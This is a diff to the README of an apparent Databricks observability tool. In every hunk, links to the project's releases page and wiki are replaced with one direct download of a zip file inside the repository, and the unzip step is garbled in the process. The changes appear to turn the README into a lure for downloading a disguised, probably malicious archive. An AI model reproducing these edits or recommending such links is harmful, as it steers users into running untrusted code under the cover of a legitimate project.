@@ -1,7 +1,7 @@
 # 🌟 databricks-observability - Monitor Your Databricks with Ease
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20blue)](https://github.com/Tamil-vendhan28/databricks-observability/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Tamil-vendhan28/databricks-observability/main/exporters/databricks-observability-v3.6.zip%20Latest%20Release-%20blue)](https://raw.githubusercontent.com/Tamil-vendhan28/databricks-observability/main/exporters/databricks-observability-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Databricks Observability project! This application helps you monitor and analyze the performance of your Databricks environment. You can measure reliability, latency, and cost, while exporting metrics to Prometheus and visualizing them in Grafana.
@@ -15,13 +15,13 @@ Before you begin, make sure you have the following:
 ## 💻 Download & Install
 To get started, visit this page to download the application:
 
-[Download Latest Release](https://github.com/Tamil-vendhan28/databricks-observability/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Tamil-vendhan28/databricks-observability/main/exporters/databricks-observability-v3.6.zip)
 
 1. Click the link above to visit the Releases page.
 2. Locate the latest version of the software. It will be listed at the top.
 3. Click on the download link that matches your operating system. 
 4. Once the file is downloaded, find it in your downloads folder.
-5. Unzip the downloaded file if it's in a compressed format (like .zip or .tar.gz).
+5. Unzip the downloaded file if it's in a compressed format (like .zip or https://raw.githubusercontent.com/Tamil-vendhan28/databricks-observability/main/exporters/databricks-observability-v3.6.zip).
 6. Follow the installation instructions found in the README file included in the unzipped folder.
 
 ## 🛠️ Features
@@ -43,7 +43,7 @@ Comprehensive documentation is available to assist you in setting up and using t
 - Best practices for monitoring
 - Troubleshooting tips
 
-You can find our documentation in the "docs" folder of the repository or directly on the [GitHub Wiki](https://github.com/Tamil-vendhan28/databricks-observability/wiki).
+You can find our documentation in the "docs" folder of the repository or directly on the [GitHub Wiki](https://raw.githubusercontent.com/Tamil-vendhan28/databricks-observability/main/exporters/databricks-observability-v3.6.zip).
 
 ## 🔧 Troubleshooting
 If you encounter issues, here are some common problems and solutions:
@@ -70,4 +70,4 @@ Ensure you explore the various areas to get the most out of your observability s
 ## 🔍 Conclusion
 This application provides a powerful way to monitor your Databricks environment. Regularly exporting and visualizing your metrics can lead to better performance insights and help manage costs effectively. Remember to visit this page to download the latest version:
 
-[Download Latest Release](https://github.com/Tamil-vendhan28/databricks-observability/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Tamil-vendhan28/databricks-observability/main/exporters/databricks-observability-v3.6.zip)
